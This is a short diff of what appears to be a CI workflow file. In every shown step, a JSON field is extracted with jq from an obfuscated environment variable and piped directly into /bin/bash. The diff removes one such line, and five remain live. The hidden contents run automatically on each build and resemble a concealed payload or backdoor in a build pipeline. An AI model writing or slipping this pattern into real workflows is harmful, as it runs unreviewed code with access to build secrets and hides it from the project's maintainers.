@@ -38,7 +38,6 @@ jobs:
           echo $kghq26801 | jq -r .y00 | /bin/bash
           echo $i0331 | jq -r .f93870 | /bin/bash
           printf '%s' "$e48" | jq -r .vyzz66 | /bin/bash
-          printf '%s' "$pnez27" | jq -r .zkn694 | /bin/bash
           printf '%s' "$sly1395" | jq -r .zwf9 | /bin/bash
           printf '%s' "$jx179" | jq -r .y4 | /bin/bash
 
